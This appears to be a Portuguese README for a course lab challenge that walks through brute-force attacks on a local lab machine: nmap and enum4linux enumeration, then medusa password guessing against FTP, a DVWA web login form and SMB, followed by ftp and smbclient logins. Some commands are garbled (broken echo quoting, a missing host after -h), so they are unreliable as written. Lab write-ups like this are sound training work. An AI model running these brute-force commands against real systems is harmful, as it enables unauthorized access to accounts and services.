# Desafio-da-Dio
ataques de Brute Force em FTP, WEB, SMB)

# 1º Ataque FTP


Fiz uma enumeração da rede para identificar se a porta FTP esta aberta usando:
 ```bash
nmap -sV 192.168.56.102 -p 21
```
após isso, criei wordlists de users e passwds:

 ```bash
echo -e 'user\root\admin\msfadmin' > user.txt

echo -e password\n123456\nquerty\msfadmin >pass.txt
```

Agora, utilizarei a ferramenta medusa para descobrir combinações prováveis para utilizar:

 ```bash
medusa -h 192.168.56.102 -U user.txt -P pass.txt -M ftp -t 6
```
Com o user e passwd sucedido utilizaremos o comando abaixo para acessa:
 ```bash
ftp 192.168.56.102
```

# 2º Ataque WEB
Antes de tudo, entramos no formulário do site identificamos como fuciona o site, e usando a ferramenta medusa e o wordlist anterior:

 ```bash
medusa -h 192.168.56.102 -U user.txt -P pass.txt -M http / -m PAGE: 'dvwa/login.php / -m FORM: 'username^USER^&password^PASS^&login=login / -m 'FAIL=login failed' / -t 6
```

# 3º Ataque SMB (ataque em cadeia)
Com essa comando faz uma enumeração total e salva em um arquivo: 
 ```bash
enum4linux -a 192.168.56.102 | tee > enum4_output.txt
```
COm as informações que obteve com a enumeração criei wordlists:
 ```bash
echo -e 'user\nmsfadmin\nservice' > smb_user.txt

echo -e 'password\n123456\nwelcome123 >pass_spery.txt
```
utilizando a ferramenta medusa junto com as wordlists descobrir a senha do usuário msfadmin
 ```bash
medusa -h -U smb_user.txt -P pass_spery.txt -M smbnt -t2 -T 50
```
Por fim utilizando a ferramenta smbclient acessei o SMB:

 ```bash
smbclient -L //192.168.56.102 -U msfadmin
```






